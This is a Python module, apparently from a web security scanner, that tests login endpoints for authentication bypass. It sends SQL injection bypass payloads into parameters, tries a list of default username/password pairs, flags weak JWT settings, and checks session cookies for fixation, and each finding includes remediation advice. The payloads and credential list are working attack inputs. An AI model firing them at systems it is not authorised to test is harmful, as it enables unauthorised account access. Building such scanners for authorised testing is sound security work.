"""Authentication Bypass attack module - Detects authentication vulnerabilities."""
from typing import Dict, List
import httpx
import hashlib
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .async_base import AsyncBaseAttackModule


class AuthBypassModule(AsyncBaseAttackModule):
    """Detects authentication bypass vulnerabilities."""
    
    def __init__(self, config: dict):
        """Initialize authentication bypass module."""
        super().__init__(config)
        self.timeout = config.get('performance', {}).get('timeout', 10)
        
        # Common default credentials
        self.default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('root', 'toor'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('user', 'user'),
            ('demo', 'demo'),
        ]
        
        # SQL injection auth bypass payloads
        self.sqli_payloads = [
            "admin'--",
            "admin' OR '1'='1",
            "admin' OR '1'='1'--",
            "admin' OR 1=1--",
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'/*",
            "' or ''='",
        ]
    
    def name(self) -> str:
        """Return module name."""
        return "auth_bypass"
    
    def description(self) -> str:
        """Return module description."""
        return "Detects authentication bypass vulnerabilities (SQLi, default creds, weak auth)"
    
    def check_applicable(self, parameter: dict, context: dict) -> bool:
        """Check if auth bypass module should run on this parameter.
        
        Args:
            parameter: Parameter dict
            context: Context dict
        
        Returns:
            bool: True if this looks like an authentication endpoint
        """
        url = context.get('url', '').lower()
        param_name = parameter.get('name', '').lower() if parameter.get('name') else ''
        
        # Look for authentication-related endpoints
        auth_indicators = [
            'login', 'signin', 'auth', 'authenticate',
            'session', 'token', 'oauth', 'sso',
            'register', 'signup', 'forgot', 'reset'
        ]
        
        # Check URL path
        for indicator in auth_indicators:
            if indicator in url:
                return True
        
        # Check parameter names
        auth_param_names = [
            'username', 'user', 'email', 'password', 'pass',
            'pwd', 'login', 'auth', 'token', 'credential'
        ]
        
        if param_name in auth_param_names:
            return True
        
        return False
    
    async def scan(self, url: str, parameter: dict, client: httpx.AsyncClient) -> List[Dict]:
        """Scan for authentication bypass vulnerabilities.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            client: Async HTTP client
        
        Returns:
            list: Findings
        """
        findings = []
        
        # Test SQL injection in auth
        sqli_finding = await self._test_sql_injection_bypass(url, parameter, client)
        if sqli_finding:
            findings.append(sqli_finding)
        
        # Test default credentials (only on login endpoints)
        if 'login' in url.lower() or 'signin' in url.lower():
            default_finding = await self._test_default_credentials(url, parameter, client)
            if default_finding:
                findings.append(default_finding)
        
        # Test weak JWT tokens
        jwt_finding = await self._test_weak_jwt(url, parameter, client)
        if jwt_finding:
            findings.append(jwt_finding)
        
        # Test session fixation
        session_finding = await self._test_session_fixation(url, parameter, client)
        if session_finding:
            findings.append(session_finding)
        
        return findings
    
    async def _test_sql_injection_bypass(self, url: str, parameter: dict, client: httpx.AsyncClient) -> Dict:
        """Test for SQL injection authentication bypass.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            client: HTTP client
        
        Returns:
            dict: Finding if vulnerable, None otherwise
        """
        param_name = parameter.get('name')
        param_location = parameter.get('location', 'query')
        
        if not param_name:
            return None
        
        try:
            # Get baseline response
            baseline_response = await client.get(url, timeout=self.timeout)
            baseline_status = baseline_response.status_code
            baseline_length = len(baseline_response.text)
            
            # Test SQL injection payloads
            for payload in self.sqli_payloads:
                try:
                    # Inject payload
                    if param_location == 'query':
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        params[param_name] = [payload]
                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(params, doseq=True), parsed.fragment
                        ))
                        response = await client.get(test_url, timeout=self.timeout)
                    else:
                        response = await client.post(url, data={param_name: payload}, timeout=self.timeout)
                    
                    # Check for successful bypass indicators
                    status_changed = response.status_code != baseline_status
                    length_changed = abs(len(response.text) - baseline_length) > 100
                    
                    # Look for success indicators
                    success_indicators = [
                        'welcome', 'dashboard', 'logout', 'profile',
                        'authenticated', 'logged in', 'admin panel',
                        'set-cookie', 'session', 'token'
                    ]
                    
                    response_lower = response.text.lower()
                    has_success_indicator = any(indicator in response_lower for indicator in success_indicators)
                    
                    # Look for redirects to authenticated areas
                    is_redirect = response.status_code in [301, 302, 303, 307, 308]
                    redirect_to_auth = False
                    if is_redirect and 'location' in response.headers:
                        location = response.headers['location'].lower()
                        redirect_to_auth = any(indicator in location for indicator in ['dashboard', 'home', 'profile', 'admin'])
                    
                    # Check for authentication cookies
                    has_auth_cookie = any(
                        cookie_name.lower() in ['session', 'auth', 'token', 'jwt', 'sessid']
                        for cookie_name in response.cookies.keys()
                    )
                    
                    # Determine if we successfully bypassed authentication
                    if (status_changed and has_success_indicator) or redirect_to_auth or has_auth_cookie:
                        return {
                            'name': 'Authentication Bypass - SQL Injection',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f"SQL injection payload '{payload}' bypassed authentication. "
                                       f"Status: {baseline_status}→{response.status_code}, "
                                       f"Length: {baseline_length}→{len(response.text)}, "
                                       f"Success indicators found: {has_success_indicator}, "
                                       f"Auth cookie set: {has_auth_cookie}",
                            'recommendation': 'Use parameterized queries/prepared statements for ALL database queries. '
                                            'Never concatenate user input into SQL queries. Implement proper input validation. '
                                            'Use ORM frameworks that prevent SQL injection. Add rate limiting and account lockout.'
                        }
                
                except (httpx.HTTPError, httpx.TimeoutException):
                    continue
        
        except Exception as e:
            if self.config.get('verbose'):
                print(f"Error testing SQL injection bypass: {e}")
        
        return None
    
    async def _test_default_credentials(self, url: str, parameter: dict, client: httpx.AsyncClient) -> Dict:
        """Test for default/weak credentials.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            client: HTTP client
        
        Returns:
            dict: Finding if vulnerable, None otherwise
        """
        try:
            # Only test a few common combinations to avoid lockout
            for username, password in self.default_creds[:5]:  # Limit to 5 attempts
                try:
                    # Try POST with common credential parameter names
                    response = await client.post(
                        url,
                        data={
                            'username': username,
                            'password': password,
                            'email': username,  # Some sites use email
                        },
                        timeout=self.timeout,
                        follow_redirects=False
                    )
                    
                    # Check for successful login indicators
                    success_indicators = [
                        'welcome', 'dashboard', 'logout', 'profile',
                        'authenticated', 'logged in', 'success'
                    ]
                    
                    response_lower = response.text.lower()
                    has_success = any(indicator in response_lower for indicator in success_indicators)
                    
                    # Check for redirect to authenticated area
                    is_redirect = response.status_code in [301, 302, 303, 307, 308]
                    
                    # Check for authentication cookies
                    has_auth_cookie = any(
                        cookie_name.lower() in ['session', 'auth', 'token', 'jwt']
                        for cookie_name in response.cookies.keys()
                    )
                    
                    if has_success or (is_redirect and has_auth_cookie):
                        return {
                            'name': 'Default Credentials',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': f"username/password",
                            'payload': f"{username}:{password}",
                            'evidence': f"Successfully authenticated with default credentials: {username}/{password}. "
                                       f"Status: {response.status_code}, "
                                       f"Success indicators: {has_success}, "
                                       f"Auth cookie: {has_auth_cookie}",
                            'recommendation': 'Force password change on first login. Disable/remove default accounts. '
                                            'Implement strong password policy. Use multi-factor authentication. '
                                            'Log and monitor failed login attempts.'
                        }
                
                except (httpx.HTTPError, httpx.TimeoutException):
                    continue
        
        except Exception as e:
            if self.config.get('verbose'):
                print(f"Error testing default credentials: {e}")
        
        return None
    
    async def _test_weak_jwt(self, url: str, parameter: dict, client: httpx.AsyncClient) -> Dict:
        """Test for weak JWT token implementation.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            client: HTTP client
        
        Returns:
            dict: Finding if vulnerable, None otherwise
        """
        try:
            # Make a request and look for JWT tokens
            response = await client.get(url, timeout=self.timeout)
            
            # Check cookies and headers for JWT tokens
            jwt_locations = []
            
            # Check cookies
            for cookie_name, cookie_value in response.cookies.items():
                if self._is_jwt(cookie_value):
                    jwt_locations.append(('cookie', cookie_name, cookie_value))
            
            # Check Authorization header in response (rare but possible)
            if 'authorization' in response.headers:
                auth_value = response.headers['authorization']
                if 'bearer' in auth_value.lower():
                    token = auth_value.split()[-1]
                    if self._is_jwt(token):
                        jwt_locations.append(('header', 'Authorization', token))
            
            # Analyze found JWTs
            for location_type, location_name, jwt_token in jwt_locations:
                issues = self._analyze_jwt(jwt_token)
                
                if issues:
                    return {
                        'name': 'Weak JWT Implementation',
                        'severity': 'High',
                        'url': url,
                        'parameter': f"{location_type}:{location_name}",
                        'payload': 'N/A',
                        'evidence': f"JWT token found in {location_type} '{location_name}' has security issues: "
                                   f"{', '.join(issues)}. Token: {jwt_token[:50]}...",
                        'recommendation': 'Use strong signing algorithms (RS256, ES256). Never use "none" algorithm. '
                                        'Set appropriate expiration times. Validate all claims. Use secret rotation. '
                                        'Implement token revocation. Store tokens securely.'
                    }
        
        except Exception as e:
            if self.config.get('verbose'):
                print(f"Error testing JWT: {e}")
        
        return None
    
    def _is_jwt(self, token: str) -> bool:
        """Check if string is a JWT token.
        
        Args:
            token: String to check
        
        Returns:
            bool: True if token is JWT format
        """
        if not isinstance(token, str):
            return False
        
        parts = token.split('.')
        return len(parts) == 3
    
    def _analyze_jwt(self, token: str) -> List[str]:
        """Analyze JWT token for security issues.
        
        Args:
            token: JWT token
        
        Returns:
            list: List of security issues found
        """
        issues = []
        
        try:
            import base64
            import json
            
            parts = token.split('.')
            if len(parts) != 3:
                return issues
            
            # Decode header
            try:
                header_data = base64.urlsafe_b64decode(parts[0] + '==')
                header = json.loads(header_data)
                
                # Check algorithm
                alg = header.get('alg', '').upper()
                
                if alg == 'NONE':
                    issues.append("Algorithm set to 'none' (no signature verification)")
                elif alg in ['HS256', 'HS384', 'HS512']:
                    issues.append(f"Using symmetric algorithm {alg} (should use asymmetric RS256/ES256)")
                
            except Exception:
                pass
            
            # Decode payload
            try:
                payload_data = base64.urlsafe_b64decode(parts[1] + '==')
                payload = json.loads(payload_data)
                
                # Check for expiration
                if 'exp' not in payload:
                    issues.append("No expiration time set (token never expires)")
                
                # Check for weak secrets in claims (sometimes devs leave hints)
                if 'secret' in str(payload).lower() or 'key' in str(payload).lower():
                    issues.append("Potentially sensitive information in claims")
            
            except Exception:
                pass
        
        except Exception:
            pass
        
        return issues
    
    async def _test_session_fixation(self, url: str, parameter: dict, client: httpx.AsyncClient) -> Dict:
        """Test for session fixation vulnerabilities.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            client: HTTP client
        
        Returns:
            dict: Finding if vulnerable, None otherwise
        """
        try:
            # Get initial session
            response1 = await client.get(url, timeout=self.timeout)
            
            # Extract session cookie
            session_cookies = {}
            for cookie_name in ['session', 'sessionid', 'sessid', 'phpsessid', 'jsessionid']:
                if cookie_name in response1.cookies:
                    session_cookies[cookie_name] = response1.cookies[cookie_name]
            
            if not session_cookies:
                return None
            
            # Try to authenticate with the same session cookie
            # (In a real scenario, we'd need valid credentials, so this is limited)
            # For now, check if session ID changes after login attempt
            
            # Make another request with the same session
            response2 = await client.get(url, timeout=self.timeout)
            
            # Check if session cookie remained the same
            session_unchanged = all(
                response2.cookies.get(name) == value
                for name, value in session_cookies.items()
            )
            
            if session_unchanged and len(session_cookies) > 0:
                # This is a weak indicator - session fixation is hard to test without auth
                # We're being conservative here
                return {
                    'name': 'Potential Session Fixation',
                    'severity': 'Medium',
                    'url': url,
                    'parameter': 'session cookie',
                    'payload': 'N/A',
                    'evidence': f"Session cookie(s) {list(session_cookies.keys())} may be vulnerable to fixation. "
                               f"Session ID was not regenerated. Further manual testing recommended.",
                    'recommendation': 'Regenerate session ID after authentication. Invalidate old session on login. '
                                    'Use secure and httponly flags on session cookies. Implement session timeout. '
                                    'Bind session to IP address (with care for legitimate IP changes).'
                }
        
        except Exception as e:
            if self.config.get('verbose'):
                print(f"Error testing session fixation: {e}")
        
        return None
